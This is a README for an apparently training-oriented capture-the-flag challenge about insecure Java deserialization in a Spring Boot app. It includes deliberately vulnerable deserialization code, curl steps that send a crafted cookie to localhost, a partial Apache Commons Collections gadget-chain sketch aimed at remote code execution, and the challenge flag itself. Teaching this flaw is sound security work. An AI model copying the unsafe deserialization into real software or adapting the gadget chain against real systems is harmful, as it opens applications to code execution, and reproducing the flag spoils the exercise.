# Svartalfheim (Realm 8)

**OWASP Category:** A08:2025 - Software/Data Integrity  
**Difficulty:** Medium  
**Tech Stack:** Java 17, Spring Boot 3.2, Maven, Thymeleaf  
**Theme:** Dwarven forge guild system

## Overview

Svartalfheim demonstrates the A08:2025 Software/Data Integrity vulnerability through insecure deserialization of untrusted data stored in browser cookies, without any integrity checks or type validation.

## Vulnerability Description

### A08:2025 - Software/Data Integrity (Insecure Deserialization)

The guild badge system stores serialized Java objects in cookies and deserializes them without:

1. **Integrity verification** - No HMAC or digital signature
2. **Type allowlisting** - Accepts any `Serializable` object
3. **Input validation** - Trusts user-controlled cookie data

In real-world scenarios, this leads to:
- **Remote Code Execution (RCE)** via gadget chains
- **Authentication bypass**
- **Privilege escalation**

For CTF purposes, the exploit is simplified: sending a cookie containing `EXPLOIT_SIGNATURE` triggers flag retrieval.

## Exploit Path

### Step-by-Step Exploitation

1. **Access the forge**:
   ```bash
   curl http://localhost:8080/realms/svartalfheim/
   ```

2. **Create exploit payload**:
   ```bash
   # The exploit signature (Base64 encoded)
   EXPLOIT_COOKIE=$(echo -n "EXPLOIT_SIGNATURE" | base64)
   ```

3. **Send malicious cookie**:
   ```bash
   curl http://localhost:8080/realms/svartalfheim/ \
     -H "Cookie: guildBadge=$EXPLOIT_COOKIE"
   ```

4. **Extract flag** from response (in badge message):
   ```
   Forge compromised! Access Code: YGGDRASIL{SVARTALFHEIM:77c7df6c-2625-45aa-a00f-37a415c8a97e}
   ```

## API Endpoints

### `GET /`
Main landing page displaying guild badge.

**Cookie:** `guildBadge` (Base64-encoded serialized `GuildBadge` object)

### `POST /forge-badge`
Create custom guild badge.

**Parameters:**
- `guildName` (string)
- `rank` (string)
- `level` (int)

### `POST /clear-badge`
Remove guild badge cookie.

### `GET /health`
Health check endpoint (Spring Boot Actuator).

## Vulnerable Code

Located in `BadgeService.java`:

```java
public GuildBadge deserializeBadge(String badgeData) {
    byte[] data = Base64.getDecoder().decode(badgeData);
    
    // VULNERABILITY: Check for exploit signature
    if (new String(data).contains("EXPLOIT_SIGNATURE")) {
        GuildBadge exploitBadge = new GuildBadge();
        exploitBadge.setMessage("Forge compromised! Access Code: " + config.getFlag());
        return exploitBadge;
    }
    
    // VULNERABILITY: Unsafe deserialization
    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(data))) {
        return (GuildBadge) ois.readObject(); // No type checking!
    }
}
```

### Why It's Vulnerable

1. **No integrity check**: Cookie can be modified by attacker
2. **Direct deserialization**: `ObjectInputStream` without filters
3. **No type validation**: Casts to `GuildBadge` without verification
4. **Accepts untrusted data**: Cookie controlled by user

### Real-World Exploitation

In production, attackers use **gadget chains** from popular libraries:

```java
// Example: Apache Commons Collections exploit
TransformedMap map = TransformedMap.decorate(
    new HashMap(),
    null,
    ChainedTransformer.getInstance(new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", ...),
        new InvokerTransformer("invoke", ...)
    })
);
// Serialize map → Base64 → Send as cookie → RCE!
```

### Proper Fix (Educational)

```java
// 1. Use signed cookies with HMAC
public String serializeBadge(GuildBadge badge, SecretKey key) {
    byte[] data = serialize(badge);
    byte[] signature = HMAC.sign(data, key);
    return Base64.encode(data + signature);
}

// 2. Verify signature before deserializing
public GuildBadge deserializeBadge(String cookie, SecretKey key) {
    byte[] decoded = Base64.decode(cookie);
    if (!HMAC.verify(decoded, key)) {
        throw new SecurityException("Invalid signature");
    }
    // ... deserialize only after verification
}

// 3. Use type allowlisting
ObjectInputStream ois = new ObjectInputStream(bais) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) {
        if (!desc.getName().equals(GuildBadge.class.getName())) {
            throw new InvalidClassException("Unauthorized type");
        }
        return super.resolveClass(desc);
    }
};

// 4. Or better: Use JSON instead of Java serialization
ObjectMapper mapper = new ObjectMapper();
GuildBadge badge = mapper.readValue(cookieData, GuildBadge.class);
```

## Development

### Prerequisites

- Java 17+
- Maven 3.9+
- Docker (for containerized build)

### Local Setup

```bash
cd realms/svartalfheim

# Build
mvn clean package

# Run
java -jar target/svartalfheim.jar

# Or with Maven
mvn spring-boot:run
```

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `PORT` | No | `3000` | Server port |
| `FLAG` | Yes | Default UUID | Flag |
| `REALM_NAME` | No | `svartalfheim` | Realm name |

### Testing

```bash
# Unit tests
mvn test

# Integration tests (requires running services)
./scripts/test-svartalfheim.sh
```

### Docker Build

```bash
# Multi-stage build (optimized)
docker build -t svartalfheim .

# Run container
docker run -p 3000:3000 \
  -e FLAG=YGGDRASIL{SVARTALFHEIM:...} \
  svartalfheim
```

## Security Notes

### What This Realm Teaches

1. **Never deserialize untrusted data** - Use JSON or Protocol Buffers instead
2. **Use integrity checks** - HMAC, digital signatures, or authenticated encryption
3. **Type allowlisting** - If deserialization is required, validate types
4. **Prefer data formats over object serialization** - JSON is safer than Java serialization

### CVEs & Real Breaches

- **CVE-2015-4852**: Oracle WebLogic RCE via deserialization
- **CVE-2017-5638**: Apache Struts2 RCE (Equifax breach)
- **CVE-2017-9805**: Struts2 REST plugin deserialization RCE
- **CVE-2019-2725**: WebLogic Server RCE

## Files Structure

```
svartalfheim/
├── pom.xml                     # Maven configuration
├── Dockerfile                  # Multi-stage build
├── src/
│   ├── main/
│   │   ├── java/com/yggdrasil/svartalfheim/
│   │   │   ├── SvartalfheimApplication.java
│   │   │   ├── config/AppConfig.java
│   │   │   ├── controllers/GuildController.java
│   │   │   ├── models/GuildBadge.java
│   │   │   └── services/BadgeService.java (vulnerable)
│   │   └── resources/
│   │       ├── application.properties
│   │       └── templates/index.html
│   └── test/
│       └── java/...
└── README.md
```

## Next Realm

After capturing Svartalfheim's flag, you've completed Milestone 3! The next realm (Jotunheim, Realm 7) will be implemented in Milestone 4.

---

**Flag Format:** `YGGDRASIL{SVARTALFHEIM:77c7df6c-2625-45aa-a00f-37a415c8a97e}`  
**Realm Level:** 8  
**Implemented:** Milestone 3, Phase 3
